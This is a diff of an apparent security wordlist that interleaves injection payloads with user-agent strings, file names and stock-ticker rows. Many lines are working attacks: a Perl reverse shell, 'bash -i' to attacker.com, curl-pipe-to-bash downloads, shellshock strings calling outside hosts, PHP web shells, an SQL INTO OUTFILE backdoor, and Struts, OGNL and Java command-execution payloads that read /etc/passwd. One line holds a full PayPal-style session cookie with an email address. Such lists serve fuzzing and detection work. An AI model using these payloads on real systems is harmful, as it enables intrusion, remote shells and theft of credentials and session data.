@@ -223,9 +223,6 @@ ${t(org.apache.commons.io.ioutils).tostring(t(java.lang.runtime).getruntime().ex
 && echo "use socket;$i="192.168.16.151";$p=443;socket(s,pf_inet,sock_stream,getprotobyname("tcp"));if(connect(s,sockaddr_in($p,inet_aton($i)))){open(stdin,">&s");open(stdout,">&s");open(stderr,">&s");exec("/bin/sh -i");};" > rev.pl
 && system('curl https://crowdshield.com/.testing/rce_vuln.txt');
 && system('sleep 5');
-&amp;id
-&amp;id=
-&amp;id_currency=
 &id=1;id=2
 &lt;;xml src=";http://ha.ckers.org/xsstest.xml"; id=i&gt;;&lt;;/xml&gt;;
 &lt;xml src=&quot;http://ha.ckers.org/xsstest.xml&quot; id=i&gt;&lt;/xml&gt;
@@ -243,16 +240,12 @@ ${t(org.apache.commons.io.ioutils).tostring(t(java.lang.runtime).getruntime().ex
 () { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12
 () { :;}; wget http://135.23.158.130/.testing/shellshock.txt?vuln=11
 () { :;};/usr/bin/perl -e 'print \"content-type: text/plain\\r\\n\\r\\nxsuccess!\";system(\"wget http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;\");'
-*&amp;id*
-*&amp;id=*
-*&amp;id_currency=
 *; ls -lhtr /var/www/
 *{t(org.apache.commons.io.ioutils).tostring(t(java.lang.runtime).getruntime().exec('id').getinputstream())}
 -1 union select "<?php system("$_request['cmd']); ?>",2,3,4,5 into outfile 'backdoor.php'
 /api/ping/;`id`
 /cgi-bin/live_api.cgi?page={{str}}&id={{num}}&ip=;id;
 /cgi-bin/mastercgi?ping=nomip&user=;id;
-/cgi-bin/operator/servetest?cmd=ntp&servername=pool.ntp.org&timezone=03:00|id||'
 /dgn/dgn_tools/ping.php?ipdm=2;id;
 /eyeos/desktop.php?baccio=eyeoptions.eyeapp&a=eyeoptions.eyeapp&_session%5busr%5d=root&_session%5bapps%5d%5beyeoptions.eyeapp%5d%5bwrapup%5d=system($cmd);&cmd=id
 /index.html|id|
@@ -267,7 +260,6 @@ ${t(org.apache.commons.io.ioutils).tostring(t(java.lang.runtime).getruntime().ex
 3disallow/action=buy&amp;id=
 3disallow/index.php?act=buy&amp;id=&amp;mod=articles
 3disallow/services/questions-answers/?pagen_&amp;id=&amp;tag
-64disallow&amp;id
 ; bash -i >& /dev/tcp/attacker.com/4444 0>&1
 ; cat /etc/passwd
 ; curl http://attacker.com/shell.sh | bash
@@ -328,15 +320,12 @@ astro36_td/v3 maui/10a1032mp_astro_w1052 release/31.12.2010 browser/opera profil
 astro36_td/v3 maui/10a1032mp_astro_w1052 release/31.12.2010 browser/opera sync/syncclient1.1 profile/midp-2.0 configuration/cldc-1.1 opera/9.80 (mtk; u; id-id) presto/2.5.28 version/10.10
 a|id
 a|id|
-basilic/config/diff.php?file=;id&new=1&old=2
 cgi-bin/cschatrbox.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')
 cgi-bin/csguestbook.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')
 cgi-bin/cslivesupport.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')
 cgi-bin/csnewspro.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')
 cgi-bin/gbook/gbook.cgi?_mailto=check;id
 cgi-bin/handler/netsonar;cat    /etc/passwd|?data=download
-cgi-bin/weblogin.cgi?username=admin';cat /etc/passwd
-config/diff.php?file=;id&new=1&old=2
 cookie_check=yes; lang=en_us%3bus; tsrce=settingsnodeweb; ts=vr%3de012017a1640a101aa0c24dafffd19fe%26vrexpyrs%3d1627438410%26vtexpyrs%3d1532769433%26vt%3de01201911640a101aa0c24dafffd19fd; x-pp-s=eyj0ijoimtuzmjc2nzy2ndq5myisim0ioiiwin0; nsid=s%3ay8glvpmkfkxj_mr2hof2tvmhueguxf1n.8s5le6ieok4gevlg59wyswy8xxzcycxwk7nwtun3utq; akdc=ccg11-origin-www-1.paypal.com; akavpau_ppsd=1532768264~id=928bd1c25ce0be991ae8f454b7c7fc8c; xppcts=f34bc8847fea2560; login_email=pete.johnson%40shaw.ca; ui_experience=home%3d2%26login_type%3demail_password; fn_dt=344a91a6fb904898a12a18a9a268cfcf; id_token=idtoken3a976f8244b84dfe948aa108edef4953; khcl0euy7aksmgfvhl7j5e7hptk=wguwe1-mrq4xoiqepo9cyaieqt2dgexq3mfzofvq-6br53skk66ufddoukdh35iuwjwxzeo33lpstkal; hac80bwxscjqz7km6voxulob534=4sixhbrkowaac6vovotkkvgd937rbje-l3g1b6zvfps0xsennvljdymdx1nsoq5e2nyynxwatknrkuhqavt9bxsdyfug8akgxrurrxw9rptrnzoll5b_2qkvbd_i6gqiwkilz0; x-pp-ads=atoboc1cw36jqolibn15jwf.2uvpho4; navcmd=_restriction-details; x-pp-p=px45apy-swrncghzjjzv6vdwdmordffif07-wchblleotuwiplwkbamfdwd6x.zga3das4imy-eotdphtc2fkw2bqb3ctl1n4ydwv9rwbkxioejsfkupxlmxgnvny5jbgnn3zevmr8nar969rtxhuyf9nbe7fgwihrnox0yz.dxxf6qux8ggvnh12nnyk.8alk2owfx3y8jdst8wtag9mtqy7zrzzsl-xtzabaarsuufulswdjuixpcs-o1ki484; segm=kpdr9wad9vnd2klo5j9sdt3jd9dr8ddbshd72ddrt8zqpln941oplfgh9isom0wdwngll83ghjir932dfkd8fcou; cwrclyrk4locv1fydgbaxinl6ig=off2i1vuw2k_ftkk5if_rl61amxxjgyp4ekn16v1tfjk5_e01fzhgus6h0ojnguomuyi3rynk5yykbm7unnli5mpha21vzgenb_ggqybqdblrw9uygrhmcywqe4gcve2afr0ebpddcyvwwp2hpf8f0pwpkqsyzc7c22bzsigaoblsn3lysnbaezbawkwhn1vwb3d_91yehpdnf-rgh6df3reyxfzssntwo5kugue7knpamyqil_ngqoj0la
 cschatrbox.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')
 cschatrbox.cgi?command=savesetup&setup=;system('cat%20{knownfile}')
@@ -352,8 +341,6 @@ declare @q nvarchar (200) 0x730065006c006500630074002000400040007600650072007300
 declare @q nvarchar (200) select @q = 0x770061006900740066006f0072002000640065006c00610079002000270030003a0030003a0031003000270000 exec(@q)
 declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)
 declare @s varchar(200) select @s = 0x77616974666f722064656c61792027303a303a31302700 exec(@s)
-devmode.action?debug=command&expression=(%23_memberaccess[%22allowstaticmethodaccess%22]%3dtrue%2c%23foo%3dnew%20java.lang.boolean(%22false%22)%20%2c%23context[%22xwork.methodaccessor.denymethodexecution%22]%3d%23foo%2c@org.apache.commons.io.ioutils@tostring(@java.lang.runtime@getruntime().exec(%27cat%20/etc/passwd%27).getinputstream()))
-easymsgb.pl?print=|id|
 echo "<?php system($_get['cmd']); ?>" > cmd.php
 echo "<?php system('dir $_get['dir']'); ?>" > dir.php
 echo "use socket;$i="192.168.16.151";$p=443;socket(s,pf_inet,sock_stream,getprotobyname("tcp"));if(connect(s,sockaddr_in($p,inet_aton($i)))){open(stdin,">&s");open(stdout,">&s");open(stderr,">&s");exec("/bin/sh -i");};" > rev.pl
@@ -366,14 +353,9 @@ exec('sleep 5');
 exec('whoami')
 exec('whoami');
 exec(@s)
-eyeos/desktop.php?baccio=eyeoptions.eyeapp&a=eyeoptions.eyeapp&_session%5busr%5d=root&_session%5bapps%5d%5beyeoptions.eyeapp%5d%5bwrapup%5d=system($cmd);&cmd=id
 firefox/12.0 (android; linux; u; id) presto/2.8.199 version/11.10 untrusted/1.0
 forumdisplay.php?globals[]=1&f=2&comma=\".system('id').\"
 id=&intextwarningpg_exec()
-infusions/downloads/downloads.php?cat_id=${system(cat /etc/passwd)}
-infusions/downloads/downloads.php?cat_id=${system(ls)}
-innoedit.cgi?download=;id|
-innoedit/innoedit.cgi?download=;id|
 insert into lol.pwn (dataz) values ("<?php system($_get['cmd']); ?>");--
 intext:phpmyadmin sql dump filetype:sql intext:insert into `admin` (`id`, `user`, `password`) values -github
 inurl:"id=" & intext:"warning: pg_exec()
@@ -392,8 +374,6 @@ line management engineering system (lems).exe.config
 line management engineering system (lems).vshost.exe
 line management engineering system (lems).vshost.exe.config
 line management engineering system (lems).vshost.exe.manifest
-line management engineering system (lems).xml
-logs/system(1).log
 mods/apage/apage.cgi?f=file.htm.|id|
 mozilla/12.0 (android; linux; u; id) presto/2.8.199 version/11.10 untrusted/1.0
 mozilla/12.0 (iphone; firefox/13.0; u; id) presto/2.8.199 version/11.10 untrusted/1.0
@@ -1572,7 +1552,6 @@ mqqbrowser/3.2/mozilla/5.0 (linux; u; android 4.0.4; id-id; cross a27 build/imm7
 nintendo - family computer disk system (20161023-053252)-xmdb.zip
 nintendo - family computer disk system (20161203-122905_cm).zip
 nintendo - family computer disk system (20161203-122905_rc).zip
-nircmd (already exists).xml
 nokia110/2.0 (03.33) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 (windows; u; windows nt 6.0; id; desktop) applewebkit/534.13 (khtml, like gecko) ucbrowser/9.5.0.449
 nokia110/2.0 (03.33) profile/midp-2.1 configuration/cldc-1.1 ucweb/2.0 (java; u; midp-2.0; id; nokia110) u2/1.0.0 ucbrowser/9.2.0.311 u2/1.0.0 mobile
 nokia110/2.0 (03.33) profile/midp-2.1 configuration/cldc-1.1 ucweb/2.0 (java; u; midp-2.0; id; nokia110) u2/1.0.0 ucbrowser/9.5.0.449 u2/1.0.0 mobile
@@ -3572,7 +3551,6 @@ opera/9.80 (x11; linux zvav; u; id) presto/2.8.119 version/11.10,gzip(gfe)
 ophach/9.99 (bkn android/midp; ophach/99.99.14912/34.1526; u; id) chuck norris/2.8.119 version/11.10
 perl/-e%20%22system('cat%20/etc/passwd');\%22
 persid         = b'p'   # push persistent object; id is taken from string arg
-php_curl_exec()_url_is_controlled_by_user.xml
 por/checkurl.csp?timeout=30&retry=1&url=http://`whoami`.admin.ceye.io
 possible assets/unity [old]/water system (test builds win32 64)/oceanbrdf_windowsbuild/oceanbrdf_windowsbuild/ocean_data/mono/etc/mono/1.0/defaultwsdlhelpgenerator.aspx
 possible assets/unity [old]/water system (test builds win32 64)/oceanbrdf_windowsbuild/oceanbrdf_windowsbuild/ocean_data/mono/etc/mono/2.0/defaultwsdlhelpgenerator.aspx
@@ -3643,8 +3621,6 @@ system('wget https://sn1persecurity.com/.testing/rce_vuln.txt');
 system('wget https://xerosecurity.com/.testing/rce_vuln.txt');
 system('whoami')
 system('whoami');
-system(24-12-2013).xml
-system(8-1-2014).xml
 s|ider
 test*; ls -lhtr /var/www/
 ts;id#
@@ -4433,7 +4409,6 @@ ucweb/2.0(symbian; u; s60 v5; id; nokia5230) u2/1.0.0 ucbrowser/8.8.1.252 u2/1.0
 ucweb/2.0(symbian; u; s60 v5; id; nokia5800 xpressmusic) u2/1.0.0 ucbrowser/8.8.1.252 u2/1.0.0 mobile
 ucweb/2.0(symbian; u; s60 v5; id; nokiac5-03) u2/1.0.0 ucbrowser/8.8.1.252 u2/1.0.0
 unknown/2.0 (java; u; midp-2.0; id-kr; mozilla) u2/1.0.0 unknown/9.5.0.449 u2/1.0.0 mobile untrusted/1.0
-upgrade_handle.php?cmd=writeuploaddir&uploaddir=%27;whoami;%27
 y|idev|ishares core msci international developed markets etf|p| |y|100|n||idev|idev|n
 y|idlb|powershares ftse international low beta equal weight portfolio|q|g|y|100|n|n||idlb|n
 y|idlv|powershares s&p international developed low volatility portfolio|p| |y|100|n||idlv|idlv|n
